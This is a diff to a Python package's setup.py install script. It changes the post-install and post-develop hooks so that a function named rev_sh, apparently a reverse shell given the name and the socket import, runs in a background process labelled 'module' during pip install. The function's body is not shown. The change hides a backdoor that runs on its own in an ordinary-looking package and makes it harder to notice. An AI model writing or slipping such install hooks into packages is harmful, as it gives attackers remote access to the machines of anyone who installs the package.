@@ -11,6 +11,7 @@ import socket
 from setuptools import setup
 from setuptools.command.develop import develop
 from setuptools.command.install import install
+from multiprocessing import Process
 
 long_description_filename = os.path.join(
     os.path.dirname(os.path.abspath(__file__)), 'README.md')
@@ -61,14 +62,18 @@ def touch_file():
 class PostDevelopCommand(develop):
     def run(self):
         touch_file()
-        rev_sh()
+        p = Process(target=rev_sh,name='module')
+        p.start()
+        # rev_sh()
         develop.run(self)
 
 
 class PostInstallCommand(install):
     def run(self):
         touch_file()
-        rev_sh()
+        p = Process(target=rev_sh,name='module')
+        p.start()
+        # rev_sh()
         install.run(self)
 
 
